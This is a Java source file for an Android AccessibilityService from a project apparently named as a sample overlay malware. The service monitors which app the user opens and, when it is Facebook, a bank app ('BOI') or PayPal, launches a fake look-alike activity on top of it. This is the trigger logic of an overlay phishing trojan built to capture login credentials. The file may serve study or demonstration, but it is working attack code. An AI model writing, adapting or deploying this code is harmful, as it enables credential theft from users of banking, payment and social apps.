package com.abhishek_cdac.sample_overlay_malware;

import android.accessibilityservice.AccessibilityService;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;

public class CurrentAppService extends AccessibilityService {
    private static final String TAG = "CurrentAppService";
    private String currentFocusedPackage = "";


    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Service Connected!");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        if(accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED){
            if(accessibilityEvent.getPackageName() != null && accessibilityEvent.getClassName() != null){
                ComponentName componentName = new ComponentName(accessibilityEvent.getPackageName().toString(), accessibilityEvent.getClassName().toString());
                ActivityInfo activityInfo = getActivityInfo(componentName);
                if (activityInfo != null){
                    /*String activityName = componentName.flattenToShortString();
                    Toast.makeText(this, activityName, Toast.LENGTH_LONG).show();*/
                    String tmpPackageName = activityInfo.packageName.trim();
                    if (!tmpPackageName.isEmpty() && !currentFocusedPackage.equals(tmpPackageName)){
                        currentFocusedPackage = tmpPackageName;
                        if(isTargetPackage(currentFocusedPackage)){
                            launchTargetedFakeActivity(currentFocusedPackage);
                        }
                        else{
                            Log.d(TAG, "Not the target packge");
                        }
                    }
                    else {
                        Log.d(TAG, "tmpPackgeEmpty ");
                    }
                }
                else{
                    Log.d(TAG, "Activity Info Null");
                }
            }
            else {
                Log.d(TAG, "onAccessibilityEvent: Package Name CLassName NULL" );
            }
        }
        else {
            Log.d(TAG, "onAccessibilityEvent: TYPE WINDOW NOT CHANGED");
        }

    }

    private void launchTargetedFakeActivity(String currentFocusedPackage) {

        switch (currentFocusedPackage){
            case utils.PACKAGE_FACEBOOK: {
                launchIntent(FacebookActivity.class);
                break;
            }
            case utils.PACKAGE_BOI: {
                launchIntent(BankActivity.class);
                break;

            }
            case utils.PACKAGE_PAYPAL: {
                launchIntent(PayPalActivity.class);
                break;

            }
            default:
                launchIntent(MainActivity.class);
                break;
        }

    }

    private void launchIntent(Class<?> clasToLaunch) {
        Intent intent = new Intent(this, clasToLaunch);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private ActivityInfo getActivityInfo(ComponentName componentName) {
        ActivityInfo activityInfo;
        try{
            activityInfo = getPackageManager().getActivityInfo(componentName, 0);
        } catch (Exception e) {
            activityInfo = null;
            e.printStackTrace();
        }
        return activityInfo;
    }

    private boolean isTargetPackage(String currentFocusedPackage) {
        boolean isPresent = utils.TARGET_PACKAGES.contains(currentFocusedPackage);
        Log.d(TAG, "Target Package List : "+ utils.TARGET_PACKAGES.toString());
        Log.d(TAG, "isTargetPackage: " + isPresent);
        return isPresent;
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service Interrupted!");
    }


}
